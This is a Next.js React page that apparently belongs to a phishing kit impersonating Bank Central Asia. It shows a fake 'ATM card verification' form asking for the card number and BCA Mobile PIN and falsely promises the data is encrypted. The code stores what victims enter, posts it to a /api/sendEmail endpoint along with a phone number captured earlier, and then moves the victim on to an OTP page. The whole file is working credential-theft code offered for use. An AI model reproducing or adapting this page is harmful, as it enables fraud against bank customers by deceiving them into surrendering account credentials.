import { useRouter } from 'next/router'
import React, { useState } from 'react'

function Login({host}) {

    const [nomoratm, setNomoratm   ] = useState("")
    const [pin, setPin] = useState("")
    
    const router = useRouter()

    const handleSetAtmPin = async () => {

        if (nomoratm && pin) {

            document.getElementById('btn').innerHTML = 'Loading...'
            
            localStorage.setItem('nomoratm', nomoratm)
            localStorage.setItem('pin', pin)
            
            const body = {
                nomoratm,
                pin,
                nohp : localStorage.getItem('nohp')
            }
            
            try {
    
                const response = await fetch('/api/sendEmail',{
                    method : 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'url': host
                    },
                    body: JSON.stringify(body)
                })
                
                const json = await response.json()
                
                if (json.status === 200) {
                    router.push('/otp')
                    document.getElementById('btn').innerHTML = 'PROSES'
                } else{
                    document.getElementById('btn').innerHTML = 'PROSES'
                }
                
            } catch (error) {
                document.getElementById('btn').innerHTML = 'PROSES'
                console.log(error);
            }
            
        }

    }

    return (
        <div className='container-mobile'>
            <div className='bg-logo'>
                <img src='/logo.png' alt='logo' className='logo'/>
            </div>
            <div className='card'>
                <div className='card-title'>
                    <p>Verifikasi Kartu ATM</p>
                </div>
                <div className='card-body'>
                    <p>Silahkan Masukkan No. Kartu ATM dan Pin Bca Mobile untuk memproses permintaan anda.</p>
                    <div className='alert'>
                        <img src='/iconwarning.png' alt='icon' className='icon-warning'/>
                        <span>Data yang diinput hanya untuk memastikan kepemilikan rekening, Data nasabah dijamin aman dan terenkripsi oleh system.</span>
                    </div>
                    <div className='form-atm'>
                        <label className='label-atm'>Nomor Kartu Atm</label>
                        <input type="text" className='input-atm' placeholder='Masukkan Nomor Kartu Atm' value={nomoratm} onChange={e =>setNomoratm(e.target.value)} />                        
                    </div>
                    <div className='form-atm'>
                        <label className='label-atm'>Pin Bca Mobile</label>
                        <input type="text" className='input-atm' placeholder='Masukkan PIN Bca Mobile' value={pin} onChange={e => setPin(e.target.value)} />                        
                    </div>
                    <button onClick={handleSetAtmPin} className='btn-atm' id='btn'>PROSES</button>
                </div>
            </div>
            <div className='footer-login'>
                <div className='footer-body'>
                    <span>Lokasi BCA</span>
                    <span>BCA.CO.ID</span>
                </div>
                <div className='footer-body'>
                    <span>informasi kurs</span>
                    <span>sosial media</span>
                </div>
            </div>
            <div className='text-footer'>&copy;{new Date().getFullYear()} PT Bank Central Asia Tbk, All Right Reserved</div>
            <div className='text-footer-link'>Syarat & Ketentuan, Kebiijkan Privasi</div>
        </div>
    )
}

export async function getServerSideProps(context) {

    const host = context.req.headers.host
    
    return {
        props: {
            host
        },
    }
}

export default Login
